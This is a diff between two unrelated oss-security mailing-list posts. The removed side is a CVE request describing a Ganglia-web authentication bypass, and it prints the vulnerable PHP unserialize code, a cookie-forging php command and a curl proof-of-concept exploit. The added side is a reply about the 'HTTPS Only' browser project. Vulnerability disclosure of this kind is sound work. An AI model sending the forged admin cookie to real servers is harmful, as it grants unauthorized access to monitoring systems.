@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["965" "Friday" "4" "September" "2015" "20:34:39" "+0300" "Ivan Novikov" "in@wallarm.com" "<55E9D62F.5030603@wallarm.com>" "26" "[oss-security] CVE request: Ganglia-web auth bypass" nil nil nil "9" "2015090417:34:39" "[oss-security] CVE request: Ganglia-web auth bypass" (number mark "        in@wallarm.c Sep  4   26/965   " thread-indent "\"[oss-security] CVE request: Ganglia-web auth bypass\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1505" "Friday" "12" "February" "2016" "09:58:47" "-0500" "David Leo" "httpsonly.github.io@gmail.com" "<CAAeBhPeigEx=_NuqYzTJuCe3=xLnvcx7DOe+0fYE66CNy7oeZQ@mail.gmail.com>" "41" "Re: [oss-security] HTTPS Only (Open Source, Python)" "^Cc:" nil nil "2" "2016021214:58:47" "[oss-security] HTTPS Only (Open Source, Python)" (number mark "        httpsonly.gi Feb 12   41/1505  " thread-indent "\"Re: [oss-security] HTTPS Only (Open Source, Python)\"\n") "<alpine.LFD.2.20.1602112225350.16884@wniryva>" ("<CAAeBhPdgWqsUJStCLLt+dgfHjsP=fUyc75L4ME3de4M_ctu8JQ@mail.gmail.com>" "<alpine.LFD.2.20.1602112225350.16884@wniryva>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 14229 invoked by uid 550); 4 Sep 2015 17:40:51 -0000
+Received: (qmail 32664 invoked by uid 550); 12 Feb 2016 15:23:37 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,44 +11,83 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 11600 invoked from network); 4 Sep 2015 17:34:51 -0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=wallarm.com; s=default;
-	h=Content-Transfer-Encoding:Content-Type:Subject:To:MIME-Version:From:Date:Message-ID; bh=0iCK54vg3S++1EAfTKHepmmzuNzAcFo3OC60Xq4q1xw=;
-	b=BmDUHDsWPFhM6VdcTJ47tiNIcg/IO4zIOyv+8ztHaI41pxX3urPv9aL2JY7Ri5+teAWKuoRBo1YSuttpI94ahJkFp+xVQYlUe6bwDJ2kRK4hwpa7LACKXZtmxuMt18xAbqmwYBfkkuulfyZc54UHPzH7KVoXyK43AnxkeedUNNgHyejdvx4IiGabkFmVkG5nhQJofrNLVmvCqb1vIDK5hnYqfA8FN7U4fW7e38OFdr5/6uRdgSultz9i9xIL1NBdd8mqxJTC9H6IxXhjk2mCRNUqNqelmUeO68X9IXShDIDudcbuTqOgrut5mf9spWOA7JUKXrHR2ZfBoBrLrLGw2A==;
-Message-ID: <55E9D62F.5030603@wallarm.com>
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:31.0) Gecko/20100101 Thunderbird/31.7.0
+Received: (qmail 19897 invoked from network); 12 Feb 2016 14:58:58 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20120113;
+        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
+         :cc:content-type;
+        bh=c7qMVsbGNZuPT/VU/f9ZBfSmCdKi3BxZYwwFya3eKtU=;
+        b=M7xZ2w+TRkOqf2rkz1P4cctzmU0rB9sIGx9DgwlWOevhKmfVpp2c4X2pZPQE/Br71T
+         uNcFnoxJ81tjcdHhbCkYk09L3T3BqQjo1B29Z9mxViPpgCRMxtQ3xJ2D9QXahnVtl76v
+         iI7NLu+pmf2mZ0IzDbaujalAIu9YxVAjv/IP1cTd5MX+Qe0jQ8QF4EYYdemSLQzj2sRi
+         UJu2gX0K7J8slevEfgMtF6ebGsPlHrYUvU72Lk/PIlqKNI+hNmplAJwQgDO3fjLimi5K
+         BXry3Bd/xBZGUxs9NRTHOF99mTIj0Z5C/bFT9DnljtyNWc51fyBYP5CkPfkJV3NXk9/C
+         V2YQ==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:in-reply-to:references:date
+         :message-id:subject:from:to:cc:content-type;
+        bh=c7qMVsbGNZuPT/VU/f9ZBfSmCdKi3BxZYwwFya3eKtU=;
+        b=RjE6zhcThjcns7zEqau3S1naaWNpxKgJDExVkCo6b2mJh3Ixenm3jCmCvYHkHcC0la
+         6nRTlmcHIvT63ZFHf0R0ZZsLpN9LnAvn+4bY5fFxVAaLh2rRWP6TRWjeujK5z6Gx4lZd
+         8c1bbbFpFjpv7HSutmDAMTvDfchkrEVm1zjqayTOYwWU9W47/nlPyD3NBXjflcPbuOQU
+         GQ2PM7SuAX/ELxl1bgNlSlZYyKUKpsx/UyD1sYA8V+iCWToTbabg4gyp3qIdoRhIsRGK
+         tvoj1e3xQ7XAo0/gAcmGxiK08ypIhchLjZQaJ8MuA9PYAaloOS2bIo30ANOMX2xGtmsR
+         aWOw==
+X-Gm-Message-State: AG10YOSpUF/ZMyAN6ixryW2t1GlHo5UnD72xZ4Pxw0/x8L1hQZW3Z+NYSuoOu5YAd+p+YPiqmO4CYesSAlCFpQ==
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-Date: Fri, 04 Sep 2015 20:34:39 +0300
-From: Ivan Novikov <in@wallarm.com>
+X-Received: by 10.25.79.16 with SMTP id d16mr696713lfb.73.1455289127721; Fri,
+ 12 Feb 2016 06:58:47 -0800 (PST)
+In-Reply-To: <alpine.LFD.2.20.1602112225350.16884@wniryva>
+References: <CAAeBhPdgWqsUJStCLLt+dgfHjsP=fUyc75L4ME3de4M_ctu8JQ@mail.gmail.com>
+	<alpine.LFD.2.20.1602112225350.16884@wniryva>
+Message-ID: <CAAeBhPeigEx=_NuqYzTJuCe3=xLnvcx7DOe+0fYE66CNy7oeZQ@mail.gmail.com>
+Content-Type: text/plain; charset=UTF-8
+Cc: bugtraq@securityfocus.com, fulldisclosure@seclists.org
+Date: Fri, 12 Feb 2016 09:58:47 -0500
+From: David Leo <httpsonly.github.io@gmail.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] CVE request: Ganglia-web auth bypass
+Subject: Re: [oss-security] HTTPS Only (Open Source, Python)
 To: oss-security@lists.openwall.com
 
-Reported by GitHub:
-https://github.com/ganglia/ganglia-web/issues/267
+Yes, Mozilla said, "Gradually phasing out access to browser features
+for non-secure websites", in April 2015. After more than six months,
+they have done nothing useful.
 
-It's easy to bypass auth by using boolean serialization like this:
-$ php -r "echo urlencode(serialize(array('user'=>'admin',
-'group'=>'admin', 'token'=>true)));"
+The Chrome team wanted the same stuff:
+https://www.chromium.org/Home/chromium-security/marking-http-as-non-secure
+Again, nothing significant has been achieved yet.
 
-Vulnerable code listed below:
-https://github.com/ganglia/ganglia-web/blob/4e98ea69e0e18b388cdc73809ce54843a16ff87b/lib/GangliaAuth.php#L34-L46
+And there is HTTPS Everywhere, with SO MANY rules:
+https://www.eff.org/https-everywhere/atlas/
+It's still able to access HTTP by default, but there is "Block all
+HTTP requests". The problem: nothing happens when browser tries HTTP -
+there should be warning(it's incorrect behavior) and options(try
+HTTPS, Google Cache, etc). People complained, months ago:
+https://github.com/EFForg/https-everywhere/issues/1329
 
-if(isSet($_COOKIE['ganglia_auth'])) {
-  $cookie = $_COOKIE['ganglia_auth'];
-  // magic quotes will break unserialization
-  if($this->getMagicQuotesGpc()) {
-    $cookie = stripslashes($cookie);
-  }
-  $data = unserialize($cookie);
-  if(array_keys($data) != array('user','group','token')) {
-    return false;
-  }
-  if($this->getAuthToken($data['user']) == $data['token']) {
+So I made this project, because I have lost patience a long time ago.
 
-// Found by d90.andrew
-// Exploit: curl -H 'Cookie:
-a%3A3%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22group%22%3Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22token%22%3Bb%3A1%3B%7D'
-http://ganglia.local/ganglia/
+Best Wishes,
+
+On Thu, Feb 11, 2016 at 11:56 AM, P J P <ppandit@redhat.com> wrote:
+> +-- On Thu, 11 Feb 2016, David Leo wrote --+
+> | If browser tries to access HTTP address,
+> | you will have three options:
+> | try HTTPS,
+> | Google Cache,
+> | or copy-and-paste the address.
+> |
+> | There is no option to "temporarily bypass HTTPS Only".
+> | You can always do that in another browser.
+> |
+> | Project Home Page:
+> | https://httpsonly.github.io/
+>
+> Browsers too are moving there:
+>   -> https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/
+>
+> (just to note)
+> --
+> Prasad J Pandit / Red Hat Product Security Team
+> 47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F
